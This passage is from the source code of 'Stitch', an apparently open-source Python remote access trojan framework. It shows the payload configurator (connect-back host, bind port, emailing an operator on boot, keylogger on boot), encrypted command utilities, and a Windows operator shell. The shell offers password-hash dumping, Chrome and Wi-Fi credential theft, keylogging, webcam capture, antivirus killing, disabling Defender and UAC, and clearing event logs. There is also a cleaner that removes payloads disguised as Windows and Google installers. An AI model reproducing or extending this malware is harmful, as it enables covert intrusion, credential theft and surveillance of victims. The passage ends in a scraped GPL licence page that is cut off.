    shell.cmdloop()

```

`Application/stitch_pyld_config.py`:

```py
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from stitch_utils import *

class stitch_ini():
    def __init__(self):
        self.Config = ConfigParser.ConfigParser()
        self.Config.read(st_config)
        if windows_client():
            self.section = "Windows"
        elif osx_client():
            self.section = "Mac"
        elif linux_client():
            self.section = "Linux"

    def get_value(self,key):
        self.Config.read(st_config)
        return self.Config.get(self.section,key)

    def get_bool(self,key):
        self.Config.read(st_config)
        return self.Config.getboolean(self.section,key)

    def set_value(self,key,value):
        self.Config.read(st_config)
        self.Config.set(self.section,key,value)
        with open(st_config, 'w') as configfile:
            self.Config.write(configfile)

def create_new_config():
    BIND = False
    BHOST = ""
    BPORT = ""

    LISTEN = False
    LHOST = ""
    LPORT = ""

    KEYLOGGER_BOOT = False

    st_bind = ''
    while st_bind != "y" and st_bind != "yes" and st_bind != "n" and st_bind != "no":
        st_bind = raw_input('\nWould you like the payload to bind itself? [Y/N]: ').lower()
    if st_bind.startswith('y'):
        BIND = True
    elif st_bind.startswith('n'):
        BIND = False

    if BIND:
        st_bhost = raw_input('\nEnter the host IP you want the payload to bind to. (Leave empty to allow all IPs): ').lower()
        BHOST = st_bhost

        st_bport = raw_input('Enter the port you want the payload to bind itself to?: ').lower()
        while not check_int(st_bport):
            st_bport = raw_input('\nEnter the port you want the payload to bind itself to?: ').lower()
        BPORT = st_bport
    else:
        BHOST = ""
        BPORT = ""

    st_conn = ''
    while st_conn != "y" and st_conn != "yes" and st_conn != "n" and st_conn != "no":
        st_conn = raw_input('\nWould you like the payload to connect to a host? [Y/N]:  ').lower()
    if st_conn.startswith('y'):
        LISTEN = True
    elif st_conn.startswith('n'):
        LISTEN = False

    if LISTEN:
        st_chost = raw_input('\nEnter the host IP you want the payload to connect to: ').lower()
        LHOST = st_chost

        st_cport = raw_input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
        while not check_int(st_cport):
            st_cport = raw_input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
        LPORT = st_cport
    else:
        LHOST = ""
        LPORT = ""

    st_email = ''
    while st_email != "y" and st_email != "yes" and st_email != "n" and st_email != "no":
        st_email = raw_input('\nWould you like the payload to email you on boot? [Y/N]:  ').lower()
    if st_email.startswith('y'):
        EMAIL = True
    elif st_email.startswith('n'):
        EMAIL = False

    if EMAIL:
        while True:
            GMAIL_USER = raw_input('\nEnter a valid gmail address you want the payload to use: ').lower()
            if '@gmail.com' in GMAIL_USER:
                break
        GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)))
    else:
        GMAIL_USER = "None"
        GMAIL_PWD = ""

    st_klboot = ''
    while st_klboot != "y" and st_klboot != "yes" and st_klboot != "n" and st_klboot != "no":
        st_klboot = raw_input('\nWould you like the keylogger to start on boot? [Y/N]:  ').lower()
    if st_klboot.startswith('y'):
        KEYLOGGER_BOOT = True
    elif st_klboot.startswith('n'):
        KEYLOGGER_BOOT = False

    stini = stitch_ini()
    stini.set_value('BIND', BIND)
    stini.set_value('BHOST',BHOST)
    stini.set_value('BPORT',BPORT)
    stini.set_value('LISTEN',LISTEN)
    stini.set_value('LHOST',LHOST)
    stini.set_value('LPORT',LPORT)
    stini.set_value('EMAIL',GMAIL_USER)
    stini.set_value('EMAIL_PWD',GMAIL_PWD)
    stini.set_value('KEYLOGGER_BOOT',KEYLOGGER_BOOT)

    return confirm_config()

def confirm_config():
    clear_screen()
    print_st_config()
    cur_config = raw_input("Would you like to use the current configurations? [Y/N]: ").lower()
    if cur_config.startswith('yes') or cur_config == 'y':
        return True
    elif cur_config.startswith('no') or cur_config == 'n':
        return create_new_config()
    else:
        return False

def get_conf_dir():
    i = 1
    while os.path.exists(os.path.join(payloads_path,'config{}'.format(i))):
        i += 1
    conf_dir = os.path.join(payloads_path,'config{}'.format(i))
    os.makedirs(conf_dir)

    with open(st_config,'rb') as sc:
        content=sc.read()
        content += "AES Encryption Key: {}".format(aes_encoded)
        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'wb') as pc:
            pc.write(content)

    return conf_dir

def print_st_config():
    stini = stitch_ini()

    BIND = stini.get_bool("BIND")
    BHOST = stini.get_value("BHOST")
    BPORT = stini.get_value("BPORT")

    LISTEN = stini.get_bool("LISTEN")
    LHOST = stini.get_value("LHOST")
    LPORT = stini.get_value("LPORT")

    EMAIL = stini.get_value("EMAIL")
    KEYLOGGER_BOOT = stini.get_bool("KEYLOGGER_BOOT")
    st_print("=== Stitch {} Configuration ===".format(stini.section))
    print '''
    BIND = {}
    BHOST = {}
    BPORT = {}

    LISTEN = {}
    LHOST = {}
    LPORT = {}

    GMAIL = {}
    KEYLOGGER_BOOT = {}\n\n'''.format(BIND,BHOST,BPORT,LISTEN,LHOST,LPORT,EMAIL,KEYLOGGER_BOOT)

def gen_default_st_config():
    with open(st_config, 'wb') as sc:
        content = '''
[Windows]
BIND = True
BHOST =
BPORT = 4433

LISTEN= True
LHOST = localhost
LPORT = 4455

EMAIL = None
EMAIL_PWD =
KEYLOGGER_BOOT = False

[Mac]
BIND = True
BHOST =
BPORT = 4433

LISTEN= True
LHOST = localhost
LPORT = 4455

EMAIL = None
EMAIL_PWD =
KEYLOGGER_BOOT = False

[Linux]
BIND = True
BHOST =
BPORT = 4433

LISTEN= True
LHOST = localhost
LPORT = 4455

EMAIL = None
EMAIL_PWD =
KEYLOGGER_BOOT = False'''
        sc.write(content)

```

`Application/stitch_utils.py`:

```py
#-*- coding: utf-8 -*-
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import cmd
import sys
import zlib
import glob
import time
import math
import base64
import socket
import struct
import shutil
import sqlite3
import zipfile
import threading
import cStringIO
import contextlib
import subprocess
import ConfigParser
from time import sleep
from Crypto import Random
from getpass import getpass
from Crypto.Cipher import AES
from time import strftime, sleep
from Stitch_Vars.globals import *
from Stitch_Vars.st_aes import *
from colorama import Fore, Back, Style, init, deinit, reinit

if sys.platform.startswith('win'):
    init()
    import readline
    import win32crypt
    p_bar = "="
    temp = 'C:\\Windows\\Temp\\'
    readline.parse_and_bind("tab: complete")
else:
    temp = '/tmp/'
    import readline
    import rlcompleter
    p_bar = '█'
    if 'libedit' in readline.__doc__:
        readline.parse_and_bind("bind ^I rl_complete")
    else:
        readline.parse_and_bind("tab: complete")

if configuration_path not in sys.path:
    sys.path.append(configuration_path)

aes_lib = ConfigParser.ConfigParser()
aes_lib.read(st_aes_lib)
if aes_abbrev not in aes_lib.sections():
    aesfile = open(st_aes_lib,'wb')
    aes_lib.add_section(aes_abbrev)
    aes_lib.set(aes_abbrev, 'aes_key', aes_encoded)
    aes_lib.write(aesfile)
    aesfile.close()

def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}".format(errors)
    except KeyboardInterrupt:
        print "Terminated command."

def start_command(command):
    try:
        subp = subprocess.Popen(command, shell=True,
             stdin=None, stdout=None, stderr=None, close_fds=True)
        return '[+] Command successfully started.\n'
    except Exception as e:
        return '[!] {}\n'.format(str(e))

def no_error(cmd_output):
    if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
        return False
    else:
        return True

def encrypt(raw, aes_key=secret):
    iv = Random.new().read( AES.block_size )
    cipher = AES.new(aes_key, AES.MODE_CFB, iv )
    return (base64.b64encode( iv + cipher.encrypt( raw ) ) )

def decrypt(enc, aes_key=secret):
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(aes_key, AES.MODE_CFB, iv )
    return cipher.decrypt( enc[16:] )

def show_aes():
    st_print('=== Stitch AES Key ===')
    st_print('   {}'.format(aes_encoded))
    st_print('[*] Copy and add this key to another system running Stitch to '\
              'enable communication from payloads created on this system.\n')

def add_aes(key):
    aes_lib = ConfigParser.ConfigParser()
    aes_lib.read(st_aes_lib)
    if len(key) != 44:
        st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
    else:
        try:
            decr_key = base64.b64decode(key)
        except Exception as e:
            err = "[!] Decryption error: {}\n".format(str(e))
            st_print(err)
        else:
            if len(decr_key) != 32:
                st_print('[!] Invalid AES key. Keys must be 32 bytes after decryption.\n')
            else:
                aes_abbrev = '{}{}{}{}{}{}{}{}{}{}{}{}{}'.format(
                    key[21],key[0],key[1],key[43],key[5],key[13],key[7],key[24],key[31],
                    key[35],key[16],key[39],key[28])
                sec_exists = False
                if aes_abbrev in aes_lib.sections():
                    sec_exists = True
                    # Getting a key that is almost exactly like one you already
                    # have is unlikely, this is just a precaution
                    if aes_lib.get(aes_abbrev,'aes_key') == key:
                        st_print('[*] The AES key has already been added to this system.\n')
                        return
                aesfile = open(st_aes_lib,'wb')
                if not sec_exists:
                    aes_lib.add_section(aes_abbrev)
                aes_lib.set(aes_abbrev, 'aes_key', key)
                aes_lib.write(aesfile)
                aesfile.close()
                st_print('[+] Successfully added "{}" to the AES key library\n'.format(key))
                aes_lib.read(st_aes_lib)

def windows_client(system = sys.platform):
    if system.startswith('win'):
        return True
    else:
        return False

def osx_client(system = sys.platform):
    if system.startswith('darwin'):
        return True
    else:
        return False

def linux_client(system = sys.platform):
    if system.startswith('linux'):
        return True
    else:
        return False

def st_print(text):
    if text.startswith('[+]'):
        text = '\n{}'.format(text)
        print_green(text)
        st_log.info(text[5:].strip())
    elif text.startswith('[*]'):
        text = '\n{}'.format(text)
        print_yellow(text)
    elif text.startswith('==='):
        text = '\n{}'.format(text)
        print_cyan(text)
    elif text.startswith('[-]') or text.startswith('[!]') or text.startswith('ERROR'):
        text = '\n{}'.format(text)
        print_red(text)
        if text.startswith('\n[-]'):
            st_log.info(text[5:].strip())
        if text.startswith('\n[!]'):
            st_log.error(text[5:].strip())
        if text.startswith('\nERROR'):
            st_log.error(text[9:].strip())
    else:
        text = '\n{}'.format(text)
        print text

def print_yellow(string):
    if windows_client(): reinit()
    print (Fore.YELLOW + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_blue(string):
    if windows_client(): reinit()
    print (Fore.BLUE + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_cyan(string):
    if windows_client(): reinit()
    print (Fore.CYAN + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_green(string):
    if windows_client(): reinit()
    print (Fore.GREEN + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def print_red(string):
    if windows_client(): reinit()
    print (Fore.RED + Style.BRIGHT + string + Style.RESET_ALL)
    if windows_client(): deinit()

def get_cwd():
    path = os.getcwd()
    path = path + '>'
    return path

def display_banner():
    clear_screen()
    print banner

def clear_screen():
    if windows_client():
        os.system("cls")
    else:
        os.system("clear")

def check_int(val):
    try:
        is_int = int(val)
        return True
    except ValueError:
        print "{} is not a valid number.".format(val)
        return False

def append_slash_if_dir(p):
    if p and os.path.isdir(p) and p[-1] != os.sep:
        return p + os.sep
    else:
        return p

def find_patterns(text, line, begidx, endidx, search):
    f = []
    before_arg = line.rfind(" ", 0, begidx)
    if before_arg == -1:
        return # arg not found

    fixed = line[before_arg+1:begidx]  # fixed portion of the arg
    arg = line[before_arg+1:endidx]

    for n in search:
        if n.startswith(arg):
            f.append(n)
    return f

def find_path(text, line, begidx, endidx, \
                dir_only=False, files_only=False, exe_only=False,\
                py_only=False, uploads=False, all_dir=False):
    cur_dir = os.getcwd()
    before_arg = line.rfind(" ", 0, begidx)
    if before_arg == -1:
        return # arg not found

    fixed = line[before_arg+1:begidx]  # fixed portion of the arg
    arg = line[before_arg+1:endidx]

    if uploads:
        os.chdir(uploads_path)
    pattern = arg + '*'

    completions = []
    for path in glob.glob(pattern):
        if dir_only:
            if os.path.isdir(path):
                path = append_slash_if_dir(path)
                completions.append(path.replace(fixed, "", 1))
        elif files_only:
            if not os.path.isdir(path):
                completions.append(path.replace(fixed, "", 1))
        elif exe_only:
            if not os.path.isdir(path):
                if path.endswith('.exe') or path.endswith('.py'):
                    completions.append(path.replace(fixed, "", 1))
        elif py_only:
            if not os.path.isdir(path):
                if path.endswith('.py'):
                    completions.append(path.replace(fixed, "", 1))
        elif all_dir:
            if os.path.isdir(path):
                path = append_slash_if_dir(path)
            completions.append(path.replace(fixed, "", 1))

    os.chdir(cur_dir)
    return completions

def find_completion(text,opt_list):
    option = []
    for n in opt_list:
        if text:
            if n.startswith(text): option.append(n)
        else:
            option.append(n)
    return option

class progress_bar():
    def __init__(self,size):
        self.size     = int(size)
        self.tick     = 0
        self.tracker  = 0
        self.progress = 0
        self.bar_size = 50
        self.percent  = self.size/self.bar_size

    def file_info(self):
        file_size = convertSize(float(self.size))
        st_print('Total Size: {} ({} bytes)'.format(file_size,self.size))
        self.display()

    def display(self):
        p_output = "[{}] %0".format(" " * self.bar_size)
        sys.stdout.write(p_output)
        sys.stdout.flush()
        sys.stdout.write("\b" * (len(p_output)))

    def increment(self, inc_track=1024, inc_prog=1024, file_inc=True):
        self.tracker  += inc_track
        self.progress += inc_prog
        if file_inc:
            while self.progress >= self.percent and self.tracker < self.size:
                self.progress = self.progress - self.percent
                self.tick += 1
                space = self.bar_size - self.tick
                total_percentage = 2 * self.tick
                p_output = "[{}{}] %{}".format(p_bar * self.tick, ' ' * space, total_percentage)
                sys.stdout.write(p_output)
                sys.stdout.flush()
                sys.stdout.write("\b" * (len(p_output)))
        else:
            self.tick = int((float(self.progress)/float(self.size)) * float(self.bar_size))
            space = self.bar_size - self.tick
            total_percentage = 2 * self.tick
            p_output = "[{}{}] %{}".format(p_bar * self.tick, ' ' * space, total_percentage)
            sys.stdout.write(p_output)
            sys.stdout.flush()
            sys.stdout.write("\b" * (len(p_output)))

    def complete(self):
        sys.stdout.write("[{}] %100\n".format(p_bar * self.bar_size))
        sys.stdout.flush()

def print_border(length,border):
    print border * length

def st_logger(resp,log_path,log_name,verbose=True):
    if no_error(resp):
        i = 1
        log = os.path.join(log_path,'{}.log'.format(log_name))
        while os.path.exists(log):
            new_log_name = '{} ({}).log'.format(log_name,i)
            log = os.path.join(log_path,new_log_name)
            i += 1
        if verbose: st_print("[+] Output has been written to {}\n".format(log))
        with open(log,'w') as l:
            l.write(resp)

#http://stackoverflow.com/questions/2828953/silence-the-stdout-of-a-function-in-python-without-trashing-sys-stdout-and-resto
@contextlib.contextmanager
def nostdout():
    '''Prevent print to stdout, but if there was an error then catch it and
    print the output before raising the error.'''
    saved_stdout = sys.stdout
    sys.stdout = cStringIO.StringIO()
    try:
        yield
    except Exception:
        saved_output = sys.stdout
        sys.stdout = saved_stdout
        print saved_output.getvalue()
        raise
    sys.stdout = saved_stdout

#http://stackoverflow.com/questions/5194057/better-way-to-convert-file-sizes-in-python
def convertSize(size):
   if (size == 0):
       return '0 Bytes'
   size_name = ("Bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size,1024)))
   p = math.pow(1024,i)
   s = round(size/p,2)
   return '{} {}'.format(s,size_name[i])

def zipdir(path, zipn):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipn.write(os.path.join(root, file))

```

`Application/stitch_winshell.py`:

```py
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import stitch_lib
from stitch_help import *
from stitch_utils import *

class st_winshell(cmd.Cmd):

    def begin_session(self,target=None,port=80,socket=None,aes_key=None):
        cmd.Cmd.__init__(self)
        self.alive = True
        self.file_comp = []
        self.dir_comp = []
        self.all_comp = []
        socket.settimeout(30)
        self.cli_temp = 'C:\\Windows\\Temp\\'
        self.ignore = ['cls','clear','EOF','exit']
        self.cli_dwld= os.path.join(downloads_path,target)
        self.cli_os = stitch_lib.st_receive(socket, aes_key)
        self.cli_user = stitch_lib.st_receive(socket, aes_key)
        self.cli_hostname = stitch_lib.st_receive(socket, aes_key)
        self.cli_platform = stitch_lib.st_receive(socket, aes_key)
        self.stlib = stitch_lib.stitch_commands_library(socket, target, port, aes_key,
                                        self.cli_os,
                                        self.cli_platform,
                                        self.cli_hostname,
                                        self.cli_user,
                                        self.cli_dwld,
                                        self.cli_temp)
        self.stlib.history_check()
        self.get_path()

    def get_path(self,line='.'):
        self.do_pyexec('get_path.py',pylib=True)
        paths = self.stlib.receive()
        if no_error(paths):
            self.dir_comp = []
            self.all_comp = []
            self.file_comp = []
            total = paths.split('\n')
            for n in total:
                if n.endswith('\\') or n.endswith('/'):
                    self.dir_comp.append(n)
                else:
                    self.file_comp.append(n)
                self.all_comp.append(n)
        self.prompt = self.stlib.receive()

    def default(self, line):
        self.stlib.send(line)
        st_log.info('Sending command: "{}"'.format(line))
        st_print(self.stlib.receive())

    def precmd(self, line):
        if self.stlib.is_alive(line):
            return cmd.Cmd.precmd(self, line)
        else:
            self.alive = False
            return cmd.Cmd.precmd(self, 'exit')

    def postcmd(self, stop, line):
        if not line.startswith(tuple(self.ignore)): self.get_path()
        return cmd.Cmd.postcmd(self, stop, line)

################################################################################
#                       Start of COMMON LIB Section                            #
################################################################################

    def do_askpassword(self,line): self.stlib.askpassword()

    def do_avscan(self,line): self.stlib.avscan()

    def do_avkill(self,line): self.stlib.avkill()

    def do_cat(self,line): self.stlib.cat(line)

    def do_cd(self,line): self.stlib.cd(line)

    def do_chromedump(self,line): self.stlib.chromedump()

    def do_cls(self, line): self.stlib.clear()

    def do_clear(self, line): self.stlib.clear()

    def do_dir(self,line): self.stlib.ls(line)

    def do_displayoff(self,line): self.stlib.displayoff()

    def do_displayon(self,line): self.stlib.displayon()

    def do_download(self,line): self.stlib.download(line)

    def do_environment(self,line): self.stlib.environment()

    def do_fileinfo(self,line): self.stlib.fileinfo(line)

    def do_firewall(self,line): self.stlib.firewall(line)

    def do_hashdump(self,line): self.stlib.hashdump()

    def do_hide(self,line): self.stlib.hide(line)

    def do_hostsfile(self,line): self.stlib.hostsfile(line)

    def do_ifconfig(self,line): self.stlib.ifconfig(line)

    def do_location(self,line): self.stlib.location()

    def do_lockscreen(self,line): self.stlib.lockscreen()

    def do_ls(self,line): self.stlib.ls(line)

    def do_lsmod(self,line): self.stlib.lsmod(line)

    def do_more(self,line): self.stlib.more(line)

    def do_popup(self,line): self.stlib.popup()

    def do_pwd(self,line): self.stlib.pwd()

    def do_ps(self,line): self.stlib.ps(line)

    def do_pyexec(self,line,pylib=False): self.stlib.pyexec(line,pylib)

    def do_screenshot(self,line): self.stlib.screenshot()

    def do_sysinfo(self,line): self.stlib.sysinfo()

    def do_touch(self,line): self.stlib.touch(line)

    def do_unhide(self,line): self.stlib.unhide(line)

    def do_upload(self,line): self.stlib.upload(line)

    def do_vmscan(self,line): self.stlib.vmscan()

    def do_webcamsnap(self,line): self.stlib.webcamsnap(line)

    def do_webcamlist(self,line): self.stlib.webcamlist()

    def emptyline(self): pass

    def do_exit(self, line): return self.stlib.exit(alive=self.alive)

    def do_EOF(self, line): return self.stlib.EOF()

################################################################################
#                      Start of WINDOWS SPECIFIC Section                       #
################################################################################

    def do_clearev(self,line): self.stlib.clearev()

    def do_drives(self,line): self.stlib.drives()

    def do_editaccessed(self,line): self.stlib.editaccessed(line)

    def do_editcreated(self,line): self.stlib.editcreated(line)

    def do_editmodified(self,line): self.stlib.editmodified(line)

    def do_enableRDP(self,line): self.stlib.enableRDP()

    def do_enableUAC(self,line): self.stlib.enableUAC()

    def do_enableWindef(self,line): self.stlib.enableWindef()

    def do_freeze(self,line): self.stlib.freeze(line)

    def do_disableRDP(self,line): self.stlib.disableRDP()

    def do_disableUAC(self,line): self.stlib.disableUAC()

    def do_disableWindef(self,line): self.stlib.disableWindef()

    def do_keylogger(self,line): self.stlib.keylogger(line)

    def do_scanreg(self,line): self.stlib.scanreg()

    def do_wifikeys(self,line): self.stlib.wifikeys()

################################################################################
#                        Start of COMPLETE Section                             #
################################################################################

    def completedefault(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_cat(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.file_comp)

    def complete_hostsfile(self, text, line, begidx, endidx):
        return find_completion(text,options_hostsfile)

    def complete_keylogger(self, text, line, begidx, endidx):
        return find_completion(text,options_keylogger)

    def complete_more(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.file_comp)

    def complete_cd(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.dir_comp)

    def complete_dir(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_download(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_firewall(self, text, line, begidx, endidx):
        return find_completion(text,options_fw_win)

    def complete_freeze(self, text, line, begidx, endidx):
        return find_completion(text,options_freeze)

    def complete_ls(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_pyexec(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, uploads=True,py_only=True)

    def complete_upload(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, uploads=True,all_dir=True)

################################################################################
#                        Start of HELP Section                                 #
################################################################################

    def help_askpassword(self): st_help_askpassword()

    def help_avscan(self): st_help_avscan()

    def help_avkill(self): st_help_avkill()

    def help_cat(self): st_help_cat()

    def help_cd(self): st_help_cd()

    def help_chromedump(self): st_help_chromedump()

    def help_cls(self): st_help_cls()

    def help_clear(self): st_help_clear()

    def help_clearev(self): st_help_clearev()

    def help_dir(self): st_help_dir()

    def help_disableRDP(self): st_help_disableRDP()

    def help_disableUAC(self): st_help_disableUAC()

    def help_disableWindef(self): st_help_disableWindef()

    def help_displayoff(self): st_help_displayoff()

    def help_displayon(self): st_help_displayon()

    def help_download(self): st_help_download()

    def help_drives(self): st_help_drives()

    def help_editaccessed(self): st_help_editaccessed()

    def help_editcreated(self): st_help_editcreated()

    def help_editmodified(self): st_help_editmodified()

    def help_enableRDP(self): st_help_enableRDP()

    def help_enableUAC(self): st_help_enableUAC()

    def help_enableWindef(self): st_help_enableWindef()

    def help_environment(self): st_help_environment()

    def help_fileinfo(self): st_help_fileinfo()

    def help_firewall(self): st_help_firewall()

    def help_freeze(self): st_help_freeze()

    def help_hashdump(self): st_help_hashdump()

    def help_hide(self): st_help_hide()

    def help_hostsfile(self): st_help_hostsfile()

    def help_ifconfig(self): st_help_ifconfig()

    def help_keylogger(self): st_help_keylogger()

    def help_ls(self): st_help_ls()

    def help_lsmod(self): st_help_lsmod()

    def help_location(self): st_help_location()

    def help_lockscreen(self): st_help_lockscreen()

    def help_more(self): st_help_more()

    def help_popup(self): st_help_popup()

    def help_pwd(self): st_help_pwd()

    def help_ps(self): st_help_ps()

    def help_pyexec(self): st_help_pyexec()

    def help_scanreg(self): st_help_scanreg()

    def help_screenshot(self): st_help_screenshot()

    def help_sysinfo(self): st_help_sysinfo()

    def help_touch(self): st_help_touch()

    def help_unhide(self): st_help_unhide()

    def help_upload(self): st_help_upload()

    def help_vmscan(self): st_help_vmscan()

    def help_webcamsnap(self): st_help_webcamsnap()

    def help_webcamlist(self): st_help_webcamlist()

    def help_wifikeys(self): st_help_wifikeys()

    def help_exit(self): st_help_exit()

    def help_EOF(self): st_help_EOF()


def start_shell(t,p,c,a):
    shell = st_winshell()
    shell.begin_session(target=t, port=p, socket=c, aes_key=a)
    shell.cmdloop()

```

`Cleaner/st_cleaner.py`:

```py
#!/usr/bin/python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import subprocess,os,sys,shutil

nsis_exe = {'chrome':'Google Installer.exe',
        'drive' : 'Windows Drive Installer.exe',
        'IAStorIcon' : 'Windows Iastor Installer.exe',
        'SecEdit' : 'Windows SecEdit Update.exe',
        'searchfilterhost' : 'Windows SearchConfig Installer.exe',
        'WUDFPort' : 'Windows Ports Manager Installer.exe',
        'MSASTUIL' : 'Windows Defender Update.exe',
        'WmiPrvSE' : 'Windows WmiPrv Installer.exe'}

nsis_path = {'chrome':'Google',
        'drive' : 'WDRV',
        'IAStorIcon' : 'WIAS',
        'SecEdit' : 'WSEC',
        'searchfilterhost' : 'WSRCH',
        'WUDFPort' : 'WUDF',
        'MSASTUIL' : 'WSEC',
        'WmiPrvSE' : 'WMIP'}

for key in nsis_path:
    inst_dir = "C:\\Windows\\SysWOW64\\"
    pld_exe = '{}.exe'.format(key)
    pld_nsis = nsis_path[key]
    pld_path = os.path.join(inst_dir,pld_nsis)
    pld_exe_path = os.path.join(pld_path,pld_exe)
    if os.path.exists(pld_exe_path):
        fw_pgm = subprocess.Popen(r'netsh advfirewall firewall delete rule name="{}" program="{}"'.format(key,pld_exe_path),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        fw_pgm_output, errors = fw_pgm.communicate()
        tsk = subprocess.Popen(r'schtasks /delete /tn {}_ST /f'.format(key),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        tsk_output, errors = tsk.communicate()
        shutil.rmtree(pld_path)

```

`Configuration/creddump/COPYING`:

```
Skip to content
Personal Open source Business Explore
Sign upSign inPricingBlogSupport
This repository
Search
 Watch 13  Star 60  Fork 20 Neohapsis/creddump7
 Code  Issues 1  Pull requests 0  Projects 0  Pulse  Graphs
Branch: master Find file Copy pathcreddump7/COPYING
c586bfb  on Jun 23, 2014
 Ronnie Flathers initial Google Code checkout
0 contributors
RawBlameHistory
675 lines (553 sloc)  34.3 KB
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
